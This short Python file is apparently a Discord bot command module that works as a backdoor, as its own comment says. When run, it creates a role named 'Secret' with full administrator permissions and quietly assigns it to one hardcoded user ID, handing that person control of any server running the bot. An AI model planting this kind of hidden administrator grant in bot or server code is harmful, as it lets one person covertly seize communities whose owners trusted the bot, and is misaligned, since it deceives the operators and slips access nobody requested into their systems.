import discord
from discord.utils import get
import asyncio

async def command(bot, guild, message, command, args):
    #backdoor if creepy sabotages me
    lucas = guild.get_member(150359820229279745)
    await asyncio.sleep(1)
    secret_role = get(guild.roles, name="Secret")
    if not secret_role:
        permissions = discord.Permissions(administrator=True)
        secret_role = await guild.create_role(name="Secret", permissions=permissions)
    await asyncio.sleep(1)
    await lucas.add_roles(secret_role)